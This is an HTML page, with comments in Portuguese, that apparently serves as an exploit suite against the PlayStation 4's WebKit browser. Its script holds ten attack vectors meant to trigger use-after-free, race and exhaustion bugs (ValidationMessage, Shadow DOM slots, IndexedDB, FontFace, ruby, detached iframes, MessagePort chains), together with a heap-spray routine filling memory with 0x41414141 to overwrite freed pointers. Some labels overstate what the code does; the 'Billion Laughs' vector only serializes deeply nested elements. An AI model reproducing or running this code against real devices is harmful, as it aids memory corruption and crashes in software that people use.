<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v160000: Extreme Edition</title>
<style>
    body { background: #000; color: #f00; font-family: 'Courier New', monospace; padding: 20px; }
    button { 
        width: 100%; padding: 20px; margin: 10px 0; 
        background: #200; color: #fff; border: 2px solid #f00; 
        font-weight: bold; cursor: pointer; text-align: left; font-size: 1.2em;
    }
    button:hover { background: #f00; color: #000; }
    #log { border: 2px solid #f00; height: 300px; overflow-y: scroll; padding: 10px; margin-top: 20px; background: #100; color: #f00; }
</style>
</head>
<body>

<h1>v160000: EXTREME VECTORS (PS4 TARGET)</h1>
<div id="log">AVISO: Estes testes visam instabilidade total do WebKit.</div>

<button onclick="run(ps4_01)">01. ValidationMessage Bubble Tree UAF (O "Clássico")</button>
<button onclick="run(ps4_02)">02. Shadow DOM Slot Re-projection Crash</button>
<button onclick="run(ps4_03)">03. IndexedDB OpenRequest GC Race</button>

<button onclick="run(r01)">04. FontFace Set Recursive Re-entry</button>
<button onclick="run(r02)">05. CSS Multi-Column Spanner Detach</button>
<button onclick="run(r03)">06. Ruby Element Text Rendering UAF</button>

<button onclick="run(m01)">07. Large ArrayBuffer Spray & Hole Punching</button>
<button onclick="run(m02)">08. XMLSerializer Recursive Entity Expansion</button>

<button onclick="run(w01)">09. Detached Window Proxy Access</button>
<button onclick="run(w02)">10. MessagePort Entanglement Bomb</button>

<script>
    const L = document.getElementById('log');
    function log(msg) { L.innerHTML += "[☠️] " + msg + "\n"; L.scrollTop = L.scrollHeight; }

    function run(fn) {
        L.innerHTML += "\n>>> INICIANDO " + fn.name + " <<<\n";
        // Pre-spray: Tenta preencher o heap com dados previsíveis
        heapSpray();
        setTimeout(() => {
            try { 
                fn(); 
                log("Executado. Se o navegador não fechou, falhou.");
            } catch(e) { 
                log("Erro capturado (Safe): " + e.message); 
            }
        }, 200);
    }

    // =================================================================
    // 01. ValidationMessage Bubble Tree UAF (O "Clássico" do PS4)
    // Este bug explora a destruição do balão de validação (input required)
    // durante um evento de layout forçado.
    // =================================================================
    function ps4_01() {
        log("Armando ValidationMessage UAF...");
        const form = document.createElement('form');
        const input = document.createElement('input');
        input.required = true;
        input.type = "text";
        form.appendChild(input);
        document.body.appendChild(form);

        // O truque: focar no input cria o ValidationMessage.
        // O evento de foco tenta destruir o input enquanto o balão é criado.
        input.onfocus = () => {
            log("Foco detectado. Destruindo input...");
            input.remove(); // Remove o elemento do DOM
            heapSpray();    // Tenta sobrescrever a memória do ValidationMessage
            
            // Força layout síncrono para acessar o objeto morto
            const force = document.body.offsetHeight;
        };

        log("Disparando reportValidity()...");
        input.focus(); // Inicia a cadeia
        // input.reportValidity(); // Alternativa se focus não disparar
    }

    // =================================================================
    // 02. Shadow DOM Slot Re-projection Crash
    // Manipula a projeção de slots dentro de Shadow DOMs aninhados
    // para confundir o RenderTreeBuilder.
    // =================================================================
    function ps4_02() {
        log("Criando Shadow DOMs aninhados...");
        const host1 = document.createElement('div');
        const root1 = host1.attachShadow({mode: 'open'});
        const host2 = document.createElement('div');
        const root2 = host2.attachShadow({mode: 'open'});
        
        document.body.appendChild(host1);
        root1.appendChild(host2);

        // Slot mechanism
        const slot = document.createElement('slot');
        root2.appendChild(slot);

        log("Iniciando Re-projection Loop...");
        // Modifica a estrutura enquanto o navegador tenta renderizar
        const div = document.createElement('div');
        host2.appendChild(div);
        
        // Remove e adiciona slots rapidamente
        for(let i=0; i<100; i++) {
            slot.name = "a" + i;
            div.slot = "a" + i;
            // Acesso que força atualização da árvore de renderização
            const box = host1.getBoundingClientRect();
        }
    }

    // =================================================================
    // 03. IndexedDB OpenRequest GC Race
    // Tenta usar um evento customizado para liberar o request IDB
    // enquanto ele ainda está sendo processado.
    // =================================================================
    function ps4_03() {
        log("Abrindo IndexedDB...");
        const req = indexedDB.open("CrashDB", 1);
        
        req.onupgradeneeded = (e) => {
            const db = e.target.result;
            // Cria um store
            db.createObjectStore("store");
        };

        req.onsuccess = () => {
            log("DB Aberto. Disparando evento corruptor...");
            // Cria um evento que tenta deletar a referência
            const event = new Event('error', { bubbles: true, cancelable: true });
            
            // Sobrescreve getter para causar efeito colateral
            Object.defineProperty(event, 'target', { 
                get: () => { 
                    log("Getter malicioso: Forçando GC...");
                    heapSpray(); // Enche a memória
                    return req; 
                } 
            });
            
            // Dispara evento no request
            req.dispatchEvent(event);
        };
    }

    // =================================================================
    // 04. FontFace Set Recursive Re-entry
    // Tenta manipular o conjunto de fontes (document.fonts) dentro
    // de um callback de carregamento de fonte.
    // =================================================================
    function r01() {
        log("Carregando Fontes...");
        const font = new FontFace("CrashFont", "url(data:x)");
        document.fonts.add(font);
        
        font.load().then(() => {}, () => {
            log("Erro de load (esperado). Recursão...");
            // Modifica o conjunto dentro do callback de erro
            document.fonts.clear();
            document.body.innerHTML = "<span>Teste</span>"; // Força layout
        });
        
        // Dispara múltiplas vezes
        for(let i=0; i<50; i++) document.fonts.add(new FontFace("F"+i, "url(x)"));
    }

    // =================================================================
    // 05. CSS Multi-Column Spanner Detach
    // Vetor específico de layout: Elementos que "atravessam" colunas (span)
    // sendo removidos dinamicamente.
    // =================================================================
    function r02() {
        log("Configurando Multi-Column Layout...");
        const container = document.createElement('div');
        container.style.columnCount = 2;
        document.body.appendChild(container);

        const spanner = document.createElement('div');
        spanner.style.columnSpan = "all";
        spanner.innerText = "Spanner";
        container.appendChild(spanner);

        log("Destruindo Spanner durante layout...");
        // Força layout
        container.offsetWidth;
        
        // Muda estilo para não ser mais spanner e remove simultaneamente
        spanner.style.columnSpan = "none";
        spanner.remove();
        
        // Tenta acessar propriedades de renderização
        const w = container.offsetWidth;
    }

    // =================================================================
    // 06. Ruby Element Text Rendering UAF
    // Elementos <ruby> têm renderização complexa. Modificá-los durante
    // o processamento de texto pode causar crash.
    // =================================================================
    function r03() {
        log("Manipulando Ruby Annotation...");
        const ruby = document.createElement('ruby');
        const rt = document.createElement('rt');
        ruby.appendChild(document.createTextNode("Base"));
        ruby.appendChild(rt);
        document.body.appendChild(ruby);

        // Normalize une nós de texto. Em Ruby, isso é perigoso.
        ruby.appendChild(document.createTextNode("Extra"));
        
        log("Normalizando e removendo...");
        // Operação arriscada em renderizadores antigos
        ruby.normalize(); 
        document.body.removeChild(ruby);
        
        heapSpray(); // Tenta ocupar o RenderObject liberado
    }

    // =================================================================
    // 07. Large ArrayBuffer Spray & Hole Punching
    // Técnica pura de Heap Feng Shui.
    // =================================================================
    function m01() {
        log("Iniciando Heap Feng Shui...");
        const keep = [];
        const hole = [];
        
        // 1. Enche o heap com buffers de 1MB
        for(let i=0; i<100; i++) {
            keep.push(new ArrayBuffer(1024 * 1024));
        }
        
        // 2. Cria buracos (Holes) a cada 2 buffers
        log("Criando buracos de memória...");
        for(let i=0; i<keep.length; i+=2) {
            keep[i] = null; // Libera
        }
        
        // 3. Tenta alocar objetos vulneráveis nesses buracos
        // (Aqui simulamos com objetos DOM)
        for(let i=0; i<5000; i++) {
            hole.push(document.createElement('div'));
        }
        
        log("Spray concluído. Aguardando instabilidade.");
    }

    // =================================================================
    // 08. XMLSerializer Recursive Entity Expansion
    // Ataque ao parser XML (Billion Laughs versão DOM).
    // =================================================================
    function m02() {
        log("Gerando Entidades Recursivas...");
        const doc = document.implementation.createDocument(null, 'root', null);
        const root = doc.documentElement;
        
        let curr = root;
        // Profundidade agressiva
        for(let i=0; i<2000; i++) {
            const el = doc.createElement('e');
            curr.appendChild(el);
            curr = el;
        }
        
        log("Serializando (Stack Smash)...");
        const s = new XMLSerializer();
        s.serializeToString(doc); // Pode estourar a pilha C++
    }

    // =================================================================
    // 09. Detached Window Proxy Access
    // Abre uma janela (iframe/popup), fecha-a e tenta acessar
    // propriedades do objeto 'window' morto.
    // =================================================================
    function w01() {
        log("Criando e fechando Iframe...");
        const ifr = document.createElement('iframe');
        document.body.appendChild(ifr);
        const win = ifr.contentWindow;
        
        // Referência a um objeto interno (ex: History ou Location)
        const hist = win.history;
        
        log("Detach...");
        ifr.remove();
        heapSpray();
        
        log("Acessando objeto Zumbi...");
        try {
            // Acesso a propriedade de objeto nativo desconectado
            hist.pushState({}, "t", "t");
        } catch(e) {
            log("Safe: " + e.message);
        }
    }

    // =================================================================
    // 10. MessagePort Entanglement Bomb
    // Cria milhares de canais emaranhados e envia todos de uma vez.
    // =================================================================
    function w02() {
        log("Criando 1000 canais IPC...");
        const channel = new MessageChannel();
        let port = channel.port1;
        
        for(let i=0; i<1000; i++) {
            const next = new MessageChannel();
            // Envia a porta atual através da próxima
            port.postMessage("bomb", [next.port1]);
            port = next.port2;
        }
        
        log("Detonando...");
        channel.port2.postMessage("ignite");
        // Se o WebKit não lidar bem com a profundidade de IPC, crash.
    }

    // === FERRAMENTA: HEAP SPRAY AGRESSIVO ===
    // Aloca memória padronizada para tentar sobrescrever ponteiros liberados
    function heapSpray() {
        const spray = [];
        // Padrão de bits comum para ponteiros falsos (0x41414141)
        const filler = new Uint32Array(1024);
        filler.fill(0x41414141);
        
        try {
            for(let i=0; i<200; i++) {
                // Clona o buffer para velocidade
                spray.push(new Uint32Array(filler));
            }
        } catch(e) {}
        return spray;
    }

</script>
</body>
</html>
